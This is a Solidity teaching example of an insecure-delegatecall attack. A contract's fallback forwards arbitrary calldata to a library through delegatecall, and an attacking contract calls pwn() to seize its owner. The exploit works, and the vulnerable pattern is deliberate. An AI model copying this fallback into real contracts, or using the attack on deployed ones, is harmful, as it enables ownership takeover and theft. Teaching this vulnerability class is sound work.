// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
Here we are taking advantage of the poor use of delegatecall to
change the contract owner a contract even though there is no obvious 
way to do so. A more complex example can be found in Delegatecall2.sol

When calling AttackingContract.attack() we trigger the fallback function
of HackableContract because no function corresponds to the function 
selector of pwn(). HackableContract then forwards the call using 
delegatecall to Lib where the pwn() function exists. delegatecall runs 
the code of Lib using the context of HackableContract so the owner of 
HackableContract is updated to msg.sender (AttackingContract).
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackableContract {
    address public owner;

    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract AttackingContract {
    address public hackableContract;

    constructor(address _hackableContract) {
        hackableContract = _hackableContract;
    }

    function attack() public {
        hackableContract.call(abi.encodeWithSignature("pwn()"));
    }
}
